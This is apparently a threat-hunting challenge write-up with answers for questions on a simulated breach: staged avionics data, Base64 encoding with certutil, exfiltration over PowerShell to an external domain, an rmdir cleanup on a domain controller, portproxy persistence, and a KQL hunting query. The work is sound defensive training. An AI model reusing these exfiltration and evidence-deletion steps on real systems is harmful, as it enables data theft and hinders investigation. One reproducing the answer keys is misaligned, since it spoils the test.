Q35 - Exfiltration Confidence Call  
100  
  
HUNT LEAD: "Before we close, give me your confidence call on the data theft.  
  
Was sensitive data successfully exfiltrated? Rate your confidence and provide three pieces of evidence to support it."  
  
Format: HIGH/MEDIUM/LOW followed by evidence in prose.  
  
Answer : HIGH. The adversary staged sensitive avionics data from C:\Engineering\Avionics\A400M_NavSys, compressed it into win_update_kb5034.zip using Compress-Archive, encoded it to Base64 via certutil.exe producing win_update_kb5034.b64, and exfiltrated it externally using PowerShell Invoke-WebRequest to cdn-telemetry.cloud-endpoint.net.  
%%

---

At 2026-02-28 04:45:49, the account HALDRIC\m.richter executed a remote WMI-driven command on SRV-DC01 via WmiPrvSE.exe, spawning cmd.exe to remove the staging directory C:\Windows\Temp\McAfee_Logs using "rmdir /s /q". This action represents deliberate anti-forensics behavior targeting credential dumping artefacts left from earlier activity, including ntds.dit extraction and associated staging files. The execution was triggered remotely rather than locally, confirming continued lateral control from WS-ENG04 and the use of stolen credentials to systematically clean up forensic evidence on the Domain Controller after data collection and exfiltration stages were completed.

KQL query used : 

```kql 
let HuntData = SilentCorridorX_CL
| where isnotempty(EventTime)
| where TimeGenerated > datetime(2026-04-07T14:00:00Z);
HuntData
| where todatetime(EventTime) between (datetime(2026-02-20) .. datetime(2026-03-06) )
| where MdeTable == "DeviceProcessEvents"
| where DeviceName == "SRV-DC01"
| where ProcessCommandLine contains "rmdir"
| where InitiatingProcessFileName != "splunkd.exe"
| project EventTime , AccountDomain , AccountName , ActionType , DeviceName , FileName , FolderPath , InitiatingProcessCommandLine , InitiatingProcessFileName , InitiatingProcessFolderPath , ProcessCommandLine
| sort by EventTime desc 
```

![[Pasted image 20260515200537.png]]

%%  
Q36 - DC Staging Cleanup  
100  
  
HUNT LEAD: "Logs weren't the only cleanup. Check SRV-DC01 for staging artefact removal."  
  
Format: Full command as logged  
  
Answer : cmd.exe /c rmdir /s /q C:\Windows\Temp\McAfee_Logs  
%%

---

%%  
Q37 - CISO Brief  
100  
  
HUNT LEAD: "Hunt's over. Hofmann needs your findings before the board meeting.  
  
Your brief must name:  
  
Both compromised user accounts  
The compromised hosts (at least one by name)  
The data targeted and how it left the network  
The persistence mechanism that survives credential resets  
One immediate containment action  
  
Write it up."  
  
Format: 4-6 sentences.  
  
Answer : Two accounts are compromised: s.brandt (initial VPN access and beachhead operations) and m.richter (stolen credentials used for lateral movement). Three hosts are fully compromised: WS-ENG04 (beachhead), SRV-DC01 (Domain Controller), and SRV-FILES02 (engineering file server). The adversary targeted C:\Engineering\Avionics\A400M_NavSys containing classified avionics data, compressed and encoded it via Compress-Archive and certutil.exe, then exfiltrated it to cdn-telemetry.cloud-endpoint.net via PowerShell Invoke-WebRequest. Persistence is maintained through netsh portproxy registry keys (HKLM\System\CurrentControlSet\Services\PortProxy\v4tov4\tcp) that survive credential resets. Immediate containment: isolate WS-ENG04, SRV-DC01, and SRV-FILES02 from the network, reset compromised credentials, and remove all portproxy configurations.  
%%

---

